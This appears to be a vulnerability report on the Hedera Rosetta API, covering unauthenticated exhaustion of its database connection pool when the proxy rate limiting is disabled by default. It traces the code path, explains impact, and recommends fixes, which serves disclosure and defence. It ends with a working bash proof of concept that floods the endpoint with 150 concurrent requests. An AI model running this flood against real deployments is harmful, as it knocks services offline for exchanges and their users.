### Title
Unauthenticated DB Connection Pool Exhaustion Leading to Effective Data-Source Isolation in Rosetta API

### Summary
The Rosetta API application applies no application-level rate limiting or concurrency control. The only intended protection — Traefik middleware with `inFlightReq` and `rateLimit` — is **disabled by default** (`global.middleware: false`). An unprivileged attacker can flood the API with concurrent DB-backed requests, saturate the 100-connection pool, and cause all legitimate requests to queue and consistently time out, effectively isolating the node from its data source for the duration of the attack.

### Finding Description

**Code path:**

`rosetta/app/config/types.go` defines `Pool.MaxOpenConnections` (default 100): [1](#0-0) 

`rosetta/app/db/db.go` applies this limit directly to the `database/sql` pool with no overflow rejection: [2](#0-1) 

`rosetta/app/db/client.go` applies a 20-second context timeout per query (covering both connection acquisition and execution): [3](#0-2) 

`rosetta/main.go` builds the HTTP server with **no concurrency-limiting middleware** — only metrics, tracing, and CORS wrappers are applied: [4](#0-3) 

The Traefik middleware chain that would enforce `inFlightReq: amount: 5` per IP and `rateLimit: average: 10` per host is gated on `global.middleware`, which defaults to **false**: [5](#0-4) [6](#0-5) 

**Root cause:** The application assumes an external proxy enforces concurrency limits, but that proxy is opt-in and off by default. Go's `database/sql` queues connection requests without bound when `MaxOpenConnections` is reached; under sustained flood, every legitimate request waits up to the full `statementTimeout` (20 s) before failing.

**Exploit flow:**
1. Attacker opens ≥100 concurrent long-running requests (e.g., `/block/transaction` or `/account/balance` with large block ranges) to the Rosetta port (default 5700).
2. All 100 pool connections are held by attacker goroutines.
3. Any legitimate request that reaches a DB-backed handler enters the `database/sql` wait queue.
4. After 20 seconds the context deadline fires and the legitimate request returns an error — but the attacker immediately replaces finished connections with new ones, keeping the pool perpetually saturated.
5. The node cannot complete any DB-backed query for the duration of the attack.

### Impact Explanation

All online-mode Rosetta endpoints (`/network/status`, `/block`, `/account/balance`, `/search/transactions`) require DB access. Under sustained pool exhaustion, every such request times out. The node reports errors to any Rosetta client (e.g., Coinbase Rosetta validator, exchange integrations) and cannot confirm block finality or account balances. This constitutes effective isolation from the data source without any network-layer disruption, matching the "network partition outside design parameters" classification.

### Likelihood Explanation

No authentication is required. The Rosetta port is publicly reachable by design (it is the integration endpoint for exchanges). Sending 100 concurrent HTTP POST requests with slow or large payloads is trivial from a single machine or a small botnet. The attack is fully repeatable and requires no special knowledge beyond the port number and any valid Rosetta request body.

### Recommendation

1. **Enable the Traefik middleware by default** — change `global.middleware` default to `true` in `charts/hedera-mirror-rosetta/values.yaml`.
2. **Add application-level concurrency limiting** inside the Go server (e.g., a semaphore middleware that caps in-flight DB-bound requests and returns HTTP 429 immediately when the limit is reached), so protection is not solely dependent on an external proxy.
3. **Reduce `Pool.MaxOpenConnections`** to a value that leaves headroom for internal/health-check traffic even under load.
4. **Add a connection-wait timeout** via `db.SetConnMaxIdleTime` or by passing a shorter context for pool acquisition separate from query execution, so the queue does not grow unboundedly.

### Proof of Concept

```bash
# Requires: curl, GNU parallel or xargs
# Target: Rosetta API at http://<host>:5700 (no auth needed)

# 1. Craft a valid but slow block request body
BODY='{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "block_identifier":{"index":1}}'

# 2. Fire 150 concurrent requests (exceeds MaxOpenConnections=100)
seq 150 | xargs -P150 -I{} curl -s -o /dev/null \
  -X POST http://<host>:5700/block \
  -H 'Content-Type: application/json' \
  -d "$BODY" &

# 3. In parallel, send a legitimate probe and measure latency
time curl -s -X POST http://<host>:5700/network/status \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "metadata":{}}'

# Expected result: legitimate probe takes ~20 s then returns a 500/timeout error
# instead of the normal <1 s response, for as long as the flood is maintained.
```
